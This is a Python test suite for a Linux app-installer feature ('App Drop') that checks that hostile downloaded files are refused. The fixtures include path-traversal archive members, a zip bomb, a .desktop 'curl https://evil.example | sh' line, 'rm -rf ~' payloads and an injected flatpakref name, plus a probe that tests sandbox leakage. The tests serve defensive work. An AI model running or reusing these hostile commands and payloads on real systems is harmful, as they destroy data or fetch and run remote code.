#!/usr/bin/env python3
"""Gate: App Drop installs an application from a FILE — inside the person's home, with nothing
executed before consent, and nothing an archive says taken on trust.

WHY THIS EXISTS

"Put it in Applications and it is an app" is the promise. The threats are the oldest ones in
software distribution, and each has a test here that builds the hostile file for real:

  * an archive member named `../../.bashrc`, an absolute path, a link that leaves the tree, a
    device node — every one refused, with NOTHING written outside the app's own folder;
  * a bomb that expands far beyond its size — refused;
  * a package's own .desktop file saying `Exec=sh -c "curl … | sh"` — never copied: the launcher
    entry is written by MoOS and points at a file inside the app's folder;
  * a file merely CALLED `.AppImage` — what a file IS (its magic bytes) decides, never its name;
  * a `.flatpakref` naming a remote other than Flathub — a new publisher to trust: refused;
  * a folder the person made themselves in ~/Applications — never adopted, never overwritten;
  * a failed update — the version that worked comes back.

It also runs the whole chain through the real `moos-storectl install-file`, so the job document
and the Island's presence token are proven for a dropped file, and proves the AppImage path never
extracts without the sandbox.
"""

from __future__ import annotations

import importlib.machinery
import importlib.util
import io
import json
import os
import stat
import subprocess
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "system_files/usr/lib/moos"))
import moos_appdrop as appdrop  # noqa: E402

STORECTL = ROOT / "system_files/usr/bin/moos-storectl"
ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
APPIMAGE = b"\x7fELF\x02\x01\x01\x00AI\x02" + b"\x00" * 54
GOOD_DESKTOP = ("[Desktop Entry]\nType=Application\nName=Note Forge\nComment=Write things down\n"
                "Exec=sh -c \"curl https://evil.example | sh\"\nIcon=noteforge\n"
                "Categories=Office;Utility;X-Evil;\nStartupWMClass=noteforge\n")


class Home(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = Path(self.tmp.name) / "home"
        (self.home / "Downloads").mkdir(parents=True)
        self.saved = {k: os.environ.get(k) for k in ("HOME", "XDG_DATA_HOME", "XDG_RUNTIME_DIR", "XDG_CACHE_HOME", "PATH")}
        os.environ["HOME"] = str(self.home)
        os.environ.pop("XDG_DATA_HOME", None)
        # No menu tools: a gate must not rebuild the real desktop's menu.
        os.environ["PATH"] = str(Path(self.tmp.name) / "empty-bin")
        self.outside = Path(self.tmp.name) / "OUTSIDE"

    def tearDown(self):
        for key, value in self.saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        self.tmp.cleanup()

    def download(self, name: str, data: bytes) -> Path:
        path = self.home / "Downloads" / name
        path.write_bytes(data)
        return path

    def tar_bytes(self, members: list[tuple[tarfile.TarInfo, bytes | None]], mode: str = "w:gz") -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode=mode) as bundle:
            for info, data in members:
                bundle.addfile(info, io.BytesIO(data) if data is not None else None)
        return buffer.getvalue()

    @staticmethod
    def member(name: str, data: bytes = b"", mode: int = 0o644) -> tuple[tarfile.TarInfo, bytes]:
        info = tarfile.TarInfo(name)
        info.size = len(data)
        info.mode = mode
        return info, data

    def portable_app(self) -> bytes:
        return self.tar_bytes([
            self.member("noteforge-2.1/noteforge", ELF, 0o755),
            self.member("noteforge-2.1/lib/libthing.so", ELF, 0o755),
            self.member("noteforge-2.1/share/noteforge.desktop", GOOD_DESKTOP.encode()),
            self.member("noteforge-2.1/share/icons/noteforge.png", b"\x89PNG\r\n\x1a\n" + b"0" * 64),
        ])

    def nothing_escaped(self):
        self.assertFalse(self.outside.exists(), "something was written OUTSIDE the app's folder")
        self.assertFalse((self.home / ".bashrc").exists())


class WhatAFileIs(Home):
    def test_magic_decides_and_a_name_is_never_trusted_upwards(self):
        cases = {
            "Real.AppImage": (APPIMAGE, "appimage"),
            "Liar.AppImage": (b"#!/bin/sh\nrm -rf ~\n", "unknown"),
            "plain-elf": (ELF, "unknown"),
            "pkg.rpm": (b"\xed\xab\xee\xdb" + b"\0" * 60, "rpm"),
            "pkg.deb": (b"!<arch>\ndebian-binary   1700000000  0     0     100644  4         `\n2.0\n", "deb"),
            "setup.exe": (b"MZ" + b"\0" * 60, "windows"),
            "game.apk": (b"PK\x03\x04" + b"\0" * 60, "android"),
            "tool.zip": (b"PK\x03\x04" + b"\0" * 60, "archive"),
            "app.flatpakref": (b"[Flatpak Ref]\nName=org.example.App\n", "flatpakref"),
            "notes.txt": (b"hello", "unknown"),
        }
        for name, (data, expected) in cases.items():
            with self.subTest(name=name):
                self.assertEqual(appdrop.sniff(self.download(name, data)), expected)

    def test_names_are_a_persons_names(self):
        for file_name, expected in (("Obsidian-1.8.9-x86_64.AppImage", "Obsidian"),
                                    ("blender-4.3.2-linux-x64.tar.xz", "Blender"),
                                    ("krita_5.2.6-x86_64.appimage", "Krita"),
                                    ("Standard-Notes-3.195.13-linux-x86_64.AppImage", "Standard Notes"),
                                    ("LibreWolf.x86_64.AppImage", "LibreWolf.x86 64")):
            with self.subTest(file=file_name):
                name = appdrop.display_name(file_name)
                if file_name.startswith("LibreWolf"):
                    self.assertTrue(name.startswith("LibreWolf"))
                else:
                    self.assertEqual(name, expected)
        self.assertRegex(appdrop.slugify("مفكرة", "مفكرة.AppImage"), r"^app-[0-9a-f]{10}$")

    def test_only_the_persons_own_plain_files_are_looked_at(self):
        real = self.download("Tool.AppImage", APPIMAGE)
        link = self.home / "Downloads/link.AppImage"
        link.symlink_to(real)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.inspect(link)
        self.assertEqual(refused.exception.code, "not_a_plain_file")
        stranger = Path(self.tmp.name) / "elsewhere.AppImage"
        stranger.write_bytes(APPIMAGE)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.inspect(stranger)
        self.assertEqual(refused.exception.code, "outside_home")
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.inspect(self.home / "Downloads/missing.AppImage")
        self.assertEqual(refused.exception.code, "file_missing")

    def test_a_flatpakref_is_accepted_only_for_flathub(self):
        good = self.download("app.flatpakref", b"[Flatpak Ref]\nName=org.mozilla.firefox\nBranch=stable\n"
                                                b"Url=https://dl.flathub.org/repo/\nIsRuntime=false\n")
        plan = appdrop.inspect(good)
        self.assertEqual((plan.kind, plan.flatpak_id, plan.supported), ("flatpakref", "org.mozilla.firefox", True))
        for body, code in ((b"[Flatpak Ref]\nName=org.evil.App\nUrl=https://evil.example/repo/\n", "foreign_remote"),
                           (b"[Flatpak Ref]\nName=org.evil.App\n", "foreign_remote"),
                           (b"[Flatpak Ref]\nName=x; rm -rf ~\nUrl=https://dl.flathub.org/repo/\n", "bad_flatpakref"),
                           (b"[Flatpak Ref]\nName=org.freedesktop.Platform\nIsRuntime=true\n"
                            b"Url=https://dl.flathub.org/repo/\n", "bad_flatpakref")):
            with self.subTest(code=code), self.assertRaises(appdrop.DropError) as refused:
                appdrop.inspect(self.download("bad.flatpakref", body))
            self.assertEqual(refused.exception.code, code)

    def test_other_kinds_are_handed_on_or_refused_honestly(self):
        self.assertEqual(appdrop.inspect(self.download("p.rpm", b"\xed\xab\xee\xdb" + b"\0" * 60)).handoff, "rpm")
        self.assertEqual(appdrop.inspect(self.download("s.exe", b"MZ" + b"\0" * 60)).handoff, "foreign")
        deb = appdrop.inspect(self.download("p.deb", b"!<arch>\ndebian-binary   1 0 0 100644 4 `\n2.0\n"))
        self.assertEqual((deb.supported, deb.handoff, deb.refusal), (False, "", "deb_not_native"))


class PortableArchives(Home):
    def test_a_portable_app_becomes_an_app(self):
        plan = appdrop.inspect(self.download("noteforge-2.1-linux-x86_64.tar.gz", self.portable_app()))
        self.assertEqual((plan.kind, plan.name, plan.slug), ("archive", "Noteforge", "noteforge"))
        stages: list[str] = []
        manifest = appdrop.install(plan, progress=lambda stage, _pct: stages.append(stage))
        app_dir = self.home / "Applications/noteforge"
        self.assertTrue((app_dir / "noteforge").is_file(), "the single top-level folder must be unwrapped")
        self.assertEqual(manifest["exec"], str((app_dir / "noteforge").resolve()))
        entry = (self.home / ".local/share/applications/appdrop-noteforge.desktop").read_text(encoding="utf-8")
        # Display fields are read; the package's Exec line is NOT.
        self.assertIn("Name=Note Forge", entry)
        self.assertIn("Comment=Write things down", entry)
        self.assertNotIn("curl", entry)
        self.assertNotIn("sh -c", entry)
        self.assertIn(f'Exec="{app_dir.resolve()}/noteforge" %U', entry)
        self.assertIn("Categories=Office;Utility;", entry)
        self.assertNotIn("X-Evil", entry)
        self.assertIn(str(app_dir.resolve() / "share/icons/noteforge.png"), entry)
        self.assertIn("X-MoOS-AppDrop=noteforge", entry)
        self.assertEqual(stages[0], "inspecting_file")
        self.assertIn("integrating_app", stages)
        self.assertEqual([a["id"] for a in appdrop.installed()], ["noteforge"])
        # …and it leaves as cleanly as it came.
        self.assertTrue(appdrop.remove("noteforge"))
        self.assertFalse(app_dir.exists())
        self.assertFalse((self.home / ".local/share/applications/appdrop-noteforge.desktop").exists())
        self.assertEqual(appdrop.installed(), [])
        self.assertFalse(appdrop.remove("noteforge"))

    def test_hostile_members_write_nothing_anywhere(self):
        link = tarfile.TarInfo("app/escape"); link.type = tarfile.SYMTYPE; link.linkname = "../../../OUTSIDE"
        hard = tarfile.TarInfo("app/hard"); hard.type = tarfile.LNKTYPE; hard.linkname = "/etc/passwd"
        device = tarfile.TarInfo("app/null"); device.type = tarfile.CHRTYPE; device.devmajor = 1; device.devminor = 3
        attacks = {
            "dotdot": [self.member("app/ok", ELF, 0o755), self.member("../../../OUTSIDE", b"pwned")],
            "absolute": [self.member(str(self.outside), b"pwned")],
            "home": [self.member("../../.bashrc", b"pwned")],
            "symlink": [(link, None)],
            "hardlink": [(hard, None)],
            "device": [(device, None)],
        }
        for label, members in attacks.items():
            with self.subTest(attack=label):
                plan = appdrop.inspect(self.download(f"evil-{label}.tar.gz", self.tar_bytes(members)))
                with self.assertRaises((appdrop.DropError, tarfile.TarError)):
                    appdrop.install(plan)
                self.nothing_escaped()
                self.assertFalse((self.home / f"Applications/evil-{label}").exists(),
                                 "a refused archive must leave no half-installed app behind")
                self.assertEqual(appdrop.installed(), [])

    def test_a_hostile_zip_is_refused_too(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as bundle:
            bundle.writestr("app/run", ELF)
            bundle.writestr("../../../OUTSIDE", b"pwned")
        plan = appdrop.inspect(self.download("evilzip.zip", buffer.getvalue()))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "unsafe_archive")
        self.nothing_escaped()

    def test_a_bomb_is_refused(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as bundle:
            bundle.writestr("bomb/zeros", b"\0" * (96 * 1024 * 1024))        # ~100 KB on disk
        plan = appdrop.inspect(self.download("bomb.zip", buffer.getvalue()))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "archive_bomb")
        self.assertFalse((self.home / "Applications/bomb").exists())

    def test_an_archive_with_nothing_to_launch_says_so(self):
        plan = appdrop.inspect(self.download("docs.tar.gz", self.tar_bytes([self.member("docs/readme.txt", b"hi")])))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "nothing_to_launch")
        self.assertFalse((self.home / "Applications/docs").exists())

    def test_setuid_and_world_writable_bits_do_not_survive(self):
        data = self.tar_bytes([self.member("tool/tool", ELF, 0o6777)])
        appdrop.install(appdrop.inspect(self.download("tool.tar.gz", data)))
        mode = stat.S_IMODE((self.home / "Applications/tool/tool").stat().st_mode)
        self.assertEqual(mode & 0o6022, 0, f"mode {oct(mode)} kept setuid/setgid or group/world write")

    def test_a_folder_the_person_made_is_never_adopted(self):
        mine = self.home / "Applications/noteforge"
        mine.mkdir(parents=True)
        (mine / "my-notes.txt").write_text("mine", encoding="utf-8")
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.inspect(self.download("noteforge-2.1.tar.gz", self.portable_app()))
        self.assertEqual(refused.exception.code, "name_taken")
        self.assertEqual((mine / "my-notes.txt").read_text(encoding="utf-8"), "mine")

    def test_a_failed_update_brings_back_the_version_that_worked(self):
        appdrop.install(appdrop.inspect(self.download("noteforge-2.1.tar.gz", self.portable_app())))
        working = (self.home / "Applications/noteforge/noteforge").read_bytes()
        broken = self.tar_bytes([self.member("noteforge-3.0/readme.txt", b"no program in this release")])
        plan = appdrop.inspect(self.download("noteforge-3.0.tar.gz", broken))
        self.assertTrue(plan.replaces)
        with self.assertRaises(appdrop.DropError):
            appdrop.install(plan)
        self.assertEqual((self.home / "Applications/noteforge/noteforge").read_bytes(), working)
        self.assertEqual([a["id"] for a in appdrop.installed()], ["noteforge"])


class AppImages(Home):
    def fake_extractor(self, *, succeed: bool = True):
        calls: list[list[str]] = []

        def run(argv, **_kwargs):
            calls.append(list(argv))
            out = Path(argv[argv.index("--bind") + 1])
            if succeed:
                tree = out / "squashfs-root"
                (tree / "usr/share/icons").mkdir(parents=True)
                (tree / "AppRun").write_bytes(ELF)
                (tree / "AppRun").chmod(0o4755)                      # a setuid bit the image carried
                (tree / "obsidian.desktop").write_text(GOOD_DESKTOP.replace("Note Forge", "Obsidian"), encoding="utf-8")
                (tree / "usr/share/icons/noteforge.svg").write_text("<svg/>", encoding="utf-8")
            return subprocess.CompletedProcess(argv, 0 if succeed else 1, b"", b"squashfs error")
        return run, calls

    def test_an_appimage_is_extracted_only_inside_the_sandbox(self):
        plan = appdrop.inspect(self.download("Obsidian-1.8.9.AppImage", APPIMAGE + b"payload"))
        run, calls = self.fake_extractor()
        manifest = appdrop.install(plan, run=run)
        argv = calls[0]
        self.assertEqual(argv[0], "/usr/bin/bwrap")
        for promise in ("--unshare-all", "--die-with-parent", "--new-session", "--clearenv"):
            self.assertIn(promise, argv)
        self.assertEqual(argv[argv.index("--cap-drop") + 1], "ALL")
        joined = " ".join(argv)
        self.assertNotIn(str(self.home / "Downloads"), joined, "the sandbox must never see the person's folders")
        self.assertNotIn("--share-net", joined)
        self.assertEqual(argv[-2:], ["/in/app.AppImage", "--appimage-extract"])
        self.assertIn("--ro-bind", argv[: argv.index("/in/app.AppImage")])
        app_dir = self.home / "Applications/obsidian"
        self.assertEqual(manifest["exec"], str((app_dir / "AppRun").resolve()))
        self.assertEqual(stat.S_IMODE((app_dir / "AppRun").stat().st_mode) & 0o6000, 0, "setuid survived")
        self.assertFalse(any(p.name.endswith(".image") for p in (self.home / "Applications").iterdir()),
                         "the staging copy must be cleaned up")

    def test_a_damaged_appimage_fails_cleanly(self):
        plan = appdrop.inspect(self.download("Broken.AppImage", APPIMAGE))
        run, _calls = self.fake_extractor(succeed=False)
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan, run=run)
        self.assertEqual(refused.exception.code, "appimage_unreadable")
        self.assertEqual(sorted(p.name for p in (self.home / "Applications").iterdir()), [])

    @unittest.skipUnless(Path(appdrop.BWRAP).is_file() and sys.platform.startswith("linux"),
                         "needs bubblewrap")
    def test_the_real_sandbox_hides_the_home_and_the_network(self):
        """Not a fixture: the shipped argv runs under the real bwrap, with a probe as the 'image'."""
        secret = self.home / "Documents"
        secret.mkdir()
        (secret / "diary.txt").write_text("PRIVATE-DIARY", encoding="utf-8")
        probe = self.home / "Downloads/probe"
        probe.write_text(
            "#!/bin/sh\n"
            "mkdir -p squashfs-root && cd squashfs-root || exit 9\n"
            f"cat '{secret}/diary.txt' > saw-home 2>/dev/null\n"
            "ls /home /var/home /root > saw-dirs 2>/dev/null\n"
            "(exec 3<>/dev/tcp/1.1.1.1/53) 2>/dev/null && echo yes > saw-network\n"
            "cat /proc/net/route > routes 2>/dev/null\n"
            "echo \"$HOME|$PATH\" > saw-env\n"
            "env > saw-all-env\n"
            "printf '\\177ELF' > AppRun; chmod 755 AppRun\n", encoding="utf-8")
        probe.chmod(0o755)
        out = Path(self.tmp.name) / "out"
        out.mkdir()
        done = subprocess.run(appdrop.sandbox_argv(probe, out), capture_output=True, timeout=60,
                              env=dict(os.environ, PATH="/usr/bin:/bin", MOOS_CANARY="a-secret-in-the-session",
                                       OPENROUTER_API_KEY="sk-or-canary"))
        if done.returncode != 0 and b"namespace" in done.stderr.lower():
            self.skipTest("this kernel forbids unprivileged user namespaces")
        self.assertEqual(done.returncode, 0, done.stderr.decode("utf-8", "replace"))
        tree = out / "squashfs-root"
        self.assertTrue((tree / "AppRun").is_file(), "the extractor must be able to write into /out")
        self.assertEqual((tree / "saw-home").read_text(encoding="utf-8"), "",
                         "the sandbox could READ a file in the person's home")
        self.assertNotIn("PRIVATE-DIARY", "".join(p.read_text(encoding="utf-8", errors="replace")
                                                  for p in tree.iterdir() if p.is_file()))
        self.assertFalse((tree / "saw-network").exists(), "the sandbox reached the network")
        routes = (tree / "routes").read_text(encoding="utf-8").strip().splitlines()
        self.assertLessEqual(len(routes), 1, f"the sandbox has network routes: {routes}")
        home_seen, path_seen = (tree / "saw-env").read_text(encoding="utf-8").strip().split("|")
        self.assertEqual((home_seen, path_seen), ("/out", "/usr/bin"))
        leaked = (tree / "saw-all-env").read_text(encoding="utf-8")
        self.assertNotIn("CANARY", leaked, "the session's environment leaked into the sandbox")
        self.assertNotIn("sk-or-canary", leaked, "a credential in the environment reached the sandbox")

    def test_without_the_sandbox_nothing_is_extracted(self):
        if Path(appdrop.BWRAP).is_file():
            self.skipTest("bubblewrap is installed here; the refusal path needs a machine without it")
        plan = appdrop.inspect(self.download("Tool.AppImage", APPIMAGE))
        with self.assertRaises(appdrop.DropError) as refused:
            appdrop.install(plan)
        self.assertEqual(refused.exception.code, "no_sandbox")


@unittest.skipUnless(sys.platform.startswith("linux"), "moos-storectl needs fcntl")
class ThroughTheStore(Home):
    def storectl(self, *argv: str) -> tuple[int, dict]:
        env = dict(os.environ, HOME=str(self.home), XDG_CACHE_HOME=str(self.home / ".cache"),
                   XDG_RUNTIME_DIR=str(Path(self.tmp.name) / "run"), PATH="/usr/bin:/bin")
        Path(env["XDG_RUNTIME_DIR"]).mkdir(mode=0o700, exist_ok=True)
        done = subprocess.run([sys.executable, str(STORECTL), *argv], env=env, capture_output=True,
                              text=True, encoding="utf-8", timeout=120)
        return done.returncode, json.loads(done.stdout.strip().splitlines()[-1])

    def test_a_dropped_file_is_a_store_job_the_island_can_see(self):
        archive = self.download("noteforge-2.1.tar.gz", self.portable_app())
        code, plan = self.storectl("inspect-file", str(archive))
        self.assertEqual((code, plan["state"], plan["plan"]["kind"]), (0, "success", "archive"))
        self.assertFalse((self.home / ".cache/moos-store/job.json").exists(), "inspecting must write no job")

        code, job = self.storectl("install-file", str(archive))
        self.assertEqual((code, job["state"], job["action"]), (0, "success", "install"), job)
        self.assertEqual(job["items"][0]["id"], "noteforge")
        self.assertTrue((self.home / "Applications/noteforge/noteforge").is_file())
        tokens = [p.name for p in (Path(self.tmp.name) / "run/moos-store").glob("job-*")]
        self.assertEqual(tokens, ["job-install-success-100-noteforge"], "the Island must see it finish")

        code, job = self.storectl("remove-file", "noteforge")
        self.assertEqual((code, job["state"], job["action"]), (0, "success", "remove"))
        self.assertFalse((self.home / "Applications/noteforge").exists())

    def test_a_refusal_carries_a_code_the_dialog_can_explain(self):
        evil = self.download("evil.tar.gz", self.tar_bytes([self.member("../../../OUTSIDE", b"pwned")]))
        code, job = self.storectl("install-file", str(evil))
        self.assertEqual((code, job["state"], job.get("code")), (1, "failed", "unsafe_archive"))
        self.nothing_escaped()
        code, job = self.storectl("install-file", str(self.download("p.deb", b"!<arch>\ndebian-binary 1 0 0 100644 4 `\n")))
        self.assertEqual((code, job["state"]), (2, "failed"))
        self.assertIn("deb_not_native", job["message"])


class TheDialogHalf(unittest.TestCase):
    def test_split_android_bundles_are_refused_before_consent(self):
        import runpy
        from unittest import mock
        cli = runpy.run_path(str(ROOT / "system_files/usr/bin/moos-app-drop"))
        namespace = cli["handle"].__globals__
        for suffix in (".xapk", ".apks", ".XAPK"):
            with tempfile.TemporaryDirectory() as raw:
                path = Path(raw) / ("application" + suffix)
                path.write_bytes(b"PK\x03\x04not-a-single-apk")
                with mock.patch.object(appdrop, "check_source", return_value=path), \
                     mock.patch.dict(namespace, {"ask": mock.Mock(), "tell": mock.Mock(),
                                                "storectl": mock.Mock()}), \
                     mock.patch.object(namespace["subprocess"], "Popen") as launch:
                    self.assertEqual(namespace["handle"](str(path)), 2)
                    namespace["ask"].assert_not_called()
                    namespace["storectl"].assert_not_called()
                    launch.assert_not_called()

    def test_every_refusal_has_words_in_both_languages(self):
        loader = importlib.machinery.SourceFileLoader("moos_app_drop_cli", str(ROOT / "system_files/usr/bin/moos-app-drop"))
        spec = importlib.util.spec_from_loader(loader.name, loader)
        cli = importlib.util.module_from_spec(spec)
        loader.exec_module(cli)
        source = (ROOT / "system_files/usr/lib/moos/moos_appdrop.py").read_text(encoding="utf-8")
        import re
        raised = set(re.findall(r'DropError\("([a-z_]+)"', source)) | {"deb_not_native", "bundle_unsupported", "unknown_kind"}
        raised -= {"not_installable_here", "bad_id"}                    # programming errors, never shown
        for code in sorted(raised):
            self.assertIn(code, cli.WORDS, f"a person would see the generic failure for `{code}`")
            arabic, english = cli.WORDS[code]
            self.assertRegex(arabic, r"[؀-ۿ]")
            self.assertNotRegex(english, r"[؀-ۿ]")

    def test_nothing_is_installed_without_a_dialog(self):
        source = (ROOT / "system_files/usr/bin/moos-app-drop").read_text(encoding="utf-8")
        body = source[source.index("def handle("):source.index("def scan(")]
        self.assertLess(body.index("if not ask("), body.index('storectl("install-file"'),
                        "the question must come before the install")
        self.assertIn('print(words("no_dialog")', source)
        self.assertNotIn("pkexec", source)
        self.assertNotIn("sudo", source)


if __name__ == "__main__":
    unittest.main(verbosity=2)
